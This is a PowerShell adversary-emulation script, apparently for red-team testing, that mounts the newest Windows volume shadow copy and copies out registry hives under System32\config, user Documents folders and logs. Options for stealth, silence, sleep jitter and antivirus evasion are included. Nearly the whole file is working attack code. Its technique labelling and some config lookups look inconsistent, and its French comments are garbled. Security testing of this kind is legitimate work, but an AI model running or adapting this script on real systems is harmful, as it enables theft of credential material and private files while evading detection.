# T1006.003A - Shadow Copy Access
# MITRE ATT&CK Enterprise - TA0009 - Collection
# ATOMIC ACTION: access shadow copy volumes for data extraction ONLY
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    # Optimized configuration for performance
    $config = @{
        # Configuration de base universelle
        "OUTPUT_BASE" = if ($env:T1006_003A_OUTPUT_BASE) { $env:T1006_003A_OUTPUT_BASE } else { "$env:TEMP\mitre_results" }
        "TIMEOUT" = if ($env:T1006_003A_TIMEOUT) { [int]$env:T1006_003A_TIMEOUT } else { 300 }
        "DEBUG_MODE" = $env:T1006_003A_DEBUG_MODE -eq "true"
        "STEALTH_MODE" = $env:T1006_003A_STEALTH_MODE -eq "true"
        "VERBOSE_LEVEL" = if ($env:T1006_003A_VERBOSE_LEVEL) { [int]$env:T1006_003A_VERBOSE_LEVEL } else { 1 }

        # Adaptation Windows sp  cifique
        "OS_TYPE" =  "windows"
        "SHELL_TYPE" =  "powershell"
        "EXEC_METHOD" = if ($env:T1006_003A_EXEC_METHOD) { $env:T1006_003A_EXEC_METHOD } else { "native" }

        # Gestion d'erreur optimis  e
        "RETRY_COUNT" = if ($env:T1006_003A_RETRY_COUNT) { [int]$env:T1006_003A_RETRY_COUNT } else { 1 }  # REDUCED
        "RETRY_DELAY" = if ($env:T1006_003A_RETRY_DELAY) { [int]$env:T1006_003A_RETRY_DELAY } else { 1 }  # REDUCED
        "FALLBACK_MODE" = if ($env:T1006_003A_FALLBACK_MODE) { $env:T1006_003A_FALLBACK_MODE } else { "simulate" }

        # Policy-awareness Windows simplifi  
        "POLICY_CHECK" = if ($env:T1006_003A_POLICY_CHECK) { $env:T1006_003A_POLICY_CHECK -eq "true" } else { $false }  # DISABLED for performance
        "POLICY_BYPASS" = $env:T1006_003A_POLICY_BYPASS -eq "true"
        "POLICY_SIMULATE" = if ($env:T1006_003A_POLICY_SIMULATE) { $env:T1006_003A_POLICY_SIMULATE -eq "true" } else { $false }

        # Variables sp  cialis  es
        "OUTPUT_MODE" = if ($env:T1006_003A_OUTPUT_MODE) { $env:T1006_003A_OUTPUT_MODE } else { "simple" }
        "SILENT_MODE" = $env:T1006_003A_SILENT_MODE -eq "true"

        # Defense Evasion Windows simplifi  
        "OBFUSCATION_LEVEL" = if ($env:T1006_003A_OBFUSCATION_LEVEL) { [int]$env:T1006_003A_OBFUSCATION_LEVEL } else { 0 }
        "AV_EVASION" = $env:T1006_003A_AV_EVASION -eq "true"
        "SANDBOX_DETECTION" = if ($env:T1006_003A_SANDBOX_DETECTION) { $env:T1006_003A_SANDBOX_DETECTION -eq "true" } else { $false }  # DISABLED for performance
        "SLEEP_JITTER" = if ($env:T1006_003A_SLEEP_JITTER) { [int]$env:T1006_003A_SLEEP_JITTER } else { 0 }

        # Telemetry
        "ECS_VERSION" = if ($env:T1006_003A_ECS_VERSION) { $env:T1006_003A_ECS_VERSION } else { "8.0" }
        "CORRELATION_ID" = if ($env:T1006_003A_CORRELATION_ID) { $env:T1006_003A_CORRELATION_ID } else { "auto" }
    }

    # Auto-g  n  ration correlation ID pour cha  nage DAG
    if ($Config.CORRELATION_ID -eq "auto") {
        $Config.CORRELATION_ID = "T1006_003A_" + (Get-Date -Format "yyyyMMdd_HHmmss") + "_" + (Get-Random -Maximum 9999)
    }

    return $config
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: access shadow copy volumes for data extraction ONLY
    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
        Write-Host "[INFO] Starting atomic access shadow copy volumes for data extraction..." -ForegroundColor Yellow
    }
    
    # Sleep jitter pour   vasion d  tection
    if ($Config.SLEEP_JITTER -gt 0) {
        Start-Sleep -Seconds (Get-Random -Maximum $Config.SLEEP_JITTER)
    }
    
    $results = @{
        "action" =  "access_shadow_copy_volumes_for_data_extraction"
        "technique_id" =  "T1006.003A"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1006_003a"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        # Mode simulation policy-aware
        if ($Config.EXEC_METHOD -eq "simulate") {
            $results.results = @{
                "status" =  "success"
                "simulation" = $true
                "action_performed" =  "access shadow copy volumes for data extraction"
                "output_directory" = $outputDir
            }
            
            $results.postconditions = @{
                "action_completed" = $true
                "output_generated" = $false
                "policy_compliant" = $true
                "simulated" = $true
            }
            
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                Write-Host "[SIMULATE] access shadow copy volumes for data extraction simulated successfully" -ForegroundColor Yellow
            }
            
            return $results
        }
        
        # ATOMIC ACTION EXECUTION: Access shadow copy volumes for data extraction
        $startTime = Get-Date

        # Configuration for shadow copy access
        $targetVolume = if ($Config.T1006_003A_TARGET_VOLUME) { $Config.T1006_003A_TARGET_VOLUME } else { "C:" }
        $mountPoint = if ($Config.T1006_003A_MOUNT_POINT) { $Config.T1006_003A_MOUNT_POINT } else { "S:" }
        $extractionPaths = if ($Config.T1006_003A_EXTRACTION_PATHS) { $Config.T1006_003A_EXTRACTION_PATHS } else { @("Windows\System32\config", "Users\*\Documents", "Windows\Logs") }

        $accessResults = @()
        $mountedShadows = @()

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[INFO] Starting shadow copy access for volume $targetVolume..." -ForegroundColor Green
        }

        try {
            # Step 1: Enumerate available shadow copies for the target volume
            if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                Write-Host "[INFO] Enumerating shadow copies for volume $targetVolume..." -ForegroundColor Cyan
            }

            $shadowCopies = @()
            $vssOutput = & vssadmin list shadows /for=$targetVolume 2>&1

            if ($LASTEXITCODE -eq 0) {
                $currentShadow = @{}
                foreach ($line in $vssOutput) {
                    if ($line -match "Shadow Copy ID: (.+)") {
                        if ($currentShadow.Count -gt 0) {
                            $shadowCopies += $currentShadow
                            $currentShadow = @{}
                        }
                        $currentShadow.shadow_copy_id = $matches[1].Trim()
                    }
                    elseif ($line -match "Shadow Copy Volume: (.+)") {
                        $currentShadow.shadow_volume = $matches[1].Trim()
                    }
                    elseif ($line -match "Creation Time: (.+)") {
                        $currentShadow.creation_time = $matches[1].Trim()
                    }
                }
                if ($currentShadow.Count -gt 0) {
                    $shadowCopies += $currentShadow
                }
            }

            if ($shadowCopies.Count -eq 0) {
                if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                    Write-Host "[INFO] No shadow copies found for volume $targetVolume. This is normal in test environments." -ForegroundColor Yellow
                }

                $endTime = Get-Date
                $results.results = @{
                    "status" = "success"
                    "action_performed" = "access shadow copy volumes for data extraction"
                    "output_directory" = $outputDir
                    "items_processed" = 0
                    "total_duration_seconds" = ($endTime - $startTime).TotalSeconds
                    "target_volume" = $targetVolume
                    "shadow_copies_found" = 0
                    "extraction_results" = @()
                    "info_message" = "No shadow copies available on this system. Shadow copy access requires system restore points or volume shadow copy service to be enabled."
                    "performance_metrics" = @{
                        "total_duration" = ($endTime - $startTime).TotalSeconds
                        "extractions_completed" = 0
                        "extraction_success_rate" = 0
                    }
                }

                $results.postconditions = @{
                    "action_completed" = $true
                    "output_generated" = $false
                    "policy_compliant" = $true
                    "no_shadow_copies_available" = $true
                }

                return $results
            }

            # Step 2: Select the most recent shadow copy
            $mostRecentShadow = $shadowCopies | Sort-Object -Property {
                [DateTime]::Parse($_.creation_time)
            } -Descending | Select-Object -First 1

            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                Write-Host "[INFO] Selected shadow copy: $($mostRecentShadow.shadow_volume) created $($mostRecentShadow.creation_time)" -ForegroundColor Green
            }

            # Step 3: Create a symbolic link to access the shadow copy
            $shadowPath = $mostRecentShadow.shadow_volume.TrimEnd('\')

            if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                Write-Host "[INFO] Creating symbolic link $mountPoint to $shadowPath..." -ForegroundColor Cyan
            }

            # Remove existing mount point if it exists
            if (Test-Path $mountPoint) {
                & cmd /c "rmdir $mountPoint" 2>&1 | Out-Null
            }

            # Create symbolic link
            $linkResult = & cmd /c "mklink /D $mountPoint $shadowPath" 2>&1

            if ($LASTEXITCODE -eq 0) {
                $mountedShadows += @{
                    "mount_point" = $mountPoint
                    "shadow_path" = $shadowPath
                    "shadow_copy_id" = $mostRecentShadow.shadow_copy_id
                }

                if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                    Write-Host "[SUCCESS] Shadow copy mounted successfully at $mountPoint" -ForegroundColor Green
                }
            } else {
                throw "Failed to create symbolic link: $linkResult"
            }

            # Step 4: Extract data from specified paths
            $extractionCount = 0
            foreach ($extractionPath in $extractionPaths) {
                try {
                    $sourcePath = Join-Path $mountPoint $extractionPath
                    $relativePath = $extractionPath -replace '\\', '_'
                    $destinationPath = Join-Path $outputDir "shadow_extract_$relativePath"

                    if (Test-Path $sourcePath) {
                        # Create destination directory
                        $destDir = Split-Path $destinationPath -Parent
                        if (-not (Test-Path $destDir)) {
                            New-Item -Path $destDir -ItemType Directory -Force | Out-Null
                        }

                        # Copy files
                        $copyResults = Copy-Item -Path $sourcePath -Destination $destinationPath -Recurse -Force -ErrorAction Stop

                        $extractionResult = @{
                            "extraction_path" = $extractionPath
                            "source_path" = $sourcePath
                            "destination_path" = $destinationPath
                            "status" = "success"
                            "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                        }

                        if (Test-Path $destinationPath) {
                            $extractionResult.file_count = (Get-ChildItem $destinationPath -Recurse -File -ErrorAction SilentlyContinue | Measure-Object).Count
                            $extractionResult.total_size_bytes = (Get-ChildItem $destinationPath -Recurse -File -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                        }

                        $accessResults += $extractionResult
                        $extractionCount++

                        if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                            Write-Host "[EXTRACT] Successfully extracted $extractionPath" -ForegroundColor Green
                        }

                    } else {
                        $accessResults += @{
                            "extraction_path" = $extractionPath
                            "source_path" = $sourcePath
                            "status" = "path_not_found"
                            "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                        }

                        if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                            Write-Host "[WARNING] Path $extractionPath not found in shadow copy" -ForegroundColor Yellow
                        }
                    }

                } catch {
                    $accessResults += @{
                        "extraction_path" = $extractionPath
                        "source_path" = $sourcePath
                        "status" = "extraction_failed"
                        "error" = $_.Exception.Message
                        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                    }

                    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                        Write-Host "[ERROR] Failed to extract $extractionPath : $($_.Exception.Message)" -ForegroundColor Red
                    }
                }
            }

        } finally {
            # Step 5: Clean up mounted shadow copies
            foreach ($mountedShadow in $mountedShadows) {
                try {
                    if (Test-Path $mountedShadow.mount_point) {
                        & cmd /c "rmdir $($mountedShadow.mount_point)" 2>&1 | Out-Null
                        if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                            Write-Host "[CLEANUP] Unmounted shadow copy from $($mountedShadow.mount_point)" -ForegroundColor Gray
                        }
                    }
                } catch {
                    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                        Write-Host "[WARNING] Failed to unmount $($mountedShadow.mount_point): $($_.Exception.Message)" -ForegroundColor Yellow
                    }
                }
            }
        }

        $endTime = Get-Date
        $totalDuration = ($endTime - $startTime).TotalSeconds
        
        $results.results = @{
            "status" =  "success"
            "action_performed" =  "access shadow copy volumes for data extraction"
            "output_directory" = $outputDir
            "items_processed" = $extractionCount
            "total_duration_seconds" = $totalDuration
            "target_volume" = $targetVolume
            "shadow_copies_found" = $shadowCopies.Count
            "most_recent_shadow" = @{
                "shadow_copy_id" = $mostRecentShadow.shadow_copy_id
                "shadow_volume" = $mostRecentShadow.shadow_volume
                "creation_time" = $mostRecentShadow.creation_time
            }
            "extraction_results" = $accessResults
            "mounted_shadows" = $mountedShadows
            "performance_metrics" = @{
                "total_duration" = $totalDuration
                "extractions_completed" = $extractionCount
                "extraction_success_rate" = if ($extractionPaths.Count -gt 0) { ($extractionCount / $extractionPaths.Count) * 100 } else { 0 }
            }
        }
        
        $results.postconditions = @{
            "action_completed" = $true
            "output_generated" = $true
            "policy_compliant" = $true
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[SUCCESS] access shadow copy volumes for data extraction completed successfully" -ForegroundColor Green
        }
    }
    catch {
        $results.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
        }
        
        $results.postconditions = @{
            "action_completed" = $false
            "output_generated" = $false
            "policy_compliant" = $Config.EXEC_METHOD -ne "denied"
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Error "access shadow copy volumes for data extraction failed: $($_.Exception.Message)"
        }
    }
    
    return $results
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1006_003a"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    # Mode stealth complet - aucune sortie si SILENT_MODE
    if ($Config.SILENT_MODE -and $Config.OUTPUT_MODE -eq "stealth") {
        return $outputDir
    }
    
    switch ($Config.OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "SHADOW COPY ACCESS "
                $simpleOutput += "`nAction: access shadow copy volumes for data extraction"
                $simpleOutput += "`nStatus: Success"
            } else {
                $simpleOutput = "access shadow copy volumes for data extraction failed: $($Data.results.error)"
            }
            
            if (-not $Config.SILENT_MODE) {
                Write-Output $simpleOutput
                $simpleOutput | Out-File -FilePath (Join-Path $outputDir "results_simple.txt") -Encoding UTF8
            }
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "results_debug.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.SILENT_MODE) {
                Write-Host "[DEBUG] Results written to: $jsonFile" -ForegroundColor Cyan
            }
        }
        
        "stealth" {
            if (-not $Config.SILENT_MODE) {
                $jsonFile = Join-Path $outputDir "results_stealth.json"
                $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        # Validation des postconditions contractuelles Deputy
        if (-not $results.postconditions.action_completed -and $Config.EXEC_METHOD -ne "simulate") {
            throw "Postcondition failed: action not completed"
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[COMPLETE] T1006.003A atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0  # SUCCESS
    }
    catch {
        $errorMessage = $_.Exception.Message
        
        # Codes de retour explicites Deputy
        if ($errorMessage -like "*Precondition*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "SKIPPED_PRECONDITION: $errorMessage"
            }
            exit 2
        } 
        elseif ($errorMessage -like "*Policy*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "DENIED_POLICY: $errorMessage"
            }
            exit 3
        } 
        elseif ($errorMessage -like "*Postcondition*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "FAILED_POSTCONDITION: $errorMessage"
            }
            exit 4
        }
        else {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "FAILED: Micro-technique execution failed: $errorMessage"
            }
            exit 1
        }
    }
}

exit (Main)



